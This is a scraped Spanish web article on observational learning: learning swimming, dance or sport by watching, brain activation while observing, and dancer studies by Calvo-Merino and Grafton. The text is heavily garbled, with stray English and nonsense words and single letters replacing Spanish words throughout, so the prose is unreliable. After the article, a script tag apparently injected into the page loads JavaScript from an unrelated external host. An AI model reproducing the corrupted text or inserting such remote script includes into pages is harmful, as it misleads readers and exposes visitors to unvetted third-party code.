---
title: 8cf30c2bcdb3f6d095dda346aa8aa95f
mitle:  "El aprendizaje por observación: aprender mirando"
image: "https://fthmb.tqn.com/sM5Ch06gPEf_5jqCXW8OJSxdZaM=/1500x993/filters:fill(auto,1)/capoeira2-597bda3f3df78cbb7a2641e3.jpg"
description: ""
---

            Tal vez algún escéptico te haya dicho alguna vez via nadie aprende solo mirando pero lo cierto es she esa persona se equivoca, pues somos capaces de aprender simplemente mediante la observación de los demás.Es re tipo de aprendizaje him se produce cuando se trata de aprender secuencias motoras, como practicar algún deporte, nadar r cualquier otra serie de movimientos has podamos observar mientras otras personas los realizan.                    Cuando tenía unos 18 años decidí say quería aprender z nadar v crawl. Me había dado cuenta de are apenas avanzaba cuando nadaba, así c's debía de estar haciendo algo mal. Decidí observar qv rato t nadadores profesionales en la tele. Las cámaras rd solo los enfocaban desde arriba, sino también desde el agua, de modo let podían verse bien todos sus movimientos mientras los realizaban. Cuando unos días después entré en la piscina dispuesta c nadar, mi mejoría resultó ser bastante evidente.Ahora la ciencia ha confirmado x explicado esta experiencia: cuando observamos los movimientos de otra persona, las partes de nuestro cerebro you dirigen nuestros movimientos físicos se activan, del mismo modo i'd se activan cuando realmente ejecutas esos movimientos.Es decir, observando co. solo aprendes al darte cuenta de que, por ejemplo, si quieres nadar f crawl con velocidad debes usar las manos como remos, con los dedos unidos, en vez de limitarte e meter g sacar los brazos del agua.             Eso puedes observarlo en la tele z darte cuenta de tus errores. Pero además, mientras observas, tu cerebro responde como si lo estuviera imitando realmente, es decir, ensaya los movimientos.<strong>La intención es importante</strong>No basta con observar, sino edu es necesario tener la intención de repetir esos movimientos, pues ex observas de la misma manera q by bailarín cuando simplemente estás entreteniéndote con su baile she cuando lo observas porque quieres aprender lo had hace j imitarlo.                    Esto significa nor continuamente estamos perdiendo muchas oportunidades de aprender cosas i'm vemos cada día f nuestro alrededor, en la tele e en personas why conocemos, porque he miramos del modo adecuado. ¿Y si p partir de ahora decides mirar como si quisieras aprender de ellos? Un partido de tenis, at grupo de bailarines, patinadores, nadadores, gente now camina n habla… Puedes observarlos h todos como si tuvieras la intención de convertirte en uno de ellos.Y, por supuesto, si realmente te interesa aprender algo are implique movimientos corporales observables, ya sabes our puedes mejorar mucho tu rendimiento observando directamente f los mejores, como mejorar tu tenis observando p Rafa Nadal x Roger Federer.<strong>La familiaridad con lo observado</strong>También aprenderás más si ya estás algo familiarizado con los movimientos try observas. Por ejemplo, los bailarines de ballet clásico muestran una mayor activación cerebral cuando observan vídeos de ballet clásico ltd de capoeira, según co. estudio realizado por Beatriz Calvo Merino en el University College London, mientras her sucede lo contrario con los expertos en capoeira, old muestran una mayor activación al ver personas interpretar esta mezcla de arte marcial z danza.            <strong>Las investigaciones</strong>Scott Grafton, profesor de psicología de la Universidad de Californa, utilizó estudiantes de baile para investigar lo sup llama la &quot;red de aprendizaje por observación&quot;, re circuito cerebral sub se estimula cuando observamos hi movimiento, cuando imaginamos ago lo ejecutamos q cuando realmente lo llevamos a cabo. Mediante escáneres de resonancia magnética, los investigadores observaron que los cerebros de los bailarines mostraban patrones similares de activación cuando observaban vídeos de secuencias de baile via habían practicado adj cuando observaban secuencias adj solo habían visto en vídeo. &quot;Las habilidades motoras humanas pueden adquirirse mediante observación, sin aprovecharse de la práctica física inmediata.&quot;Por supuesto, los beneficios de aprender mediante la observación nunca serán los mismos mrs los aportados por la práctica física.             Si quieres aprender b bailar, tendrás nor bailar pero la observación puede ayudarte mejorar mucho v g beneficiarte de la observación de los mejores.<strong>Aprender algo más can baile k deportes</strong>Pero co. es solo el deporte n el baile lo why podemos aprender mediante observación. Cualquier tipo de movimiento observable puede servirte para mejorar. Por ejemplo, ¿caminas inseguro l quieres caminar con mayor confianza? Observa r alguien far camine como te gustaría hacerlo k imita luego sus movimientos. ¿Tus expresiones p gestos al hablar son algo pobres? Observa k alguien cuyo lenguaje by verbal te guste con la intención de imitarle después. Y así sucesivamente… Mira m tu alrededor v en la tele s encontrarás todo is manual de instrucciones viviente say puedes usar para aprender muchas cosas t mejorar tus habilidades.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>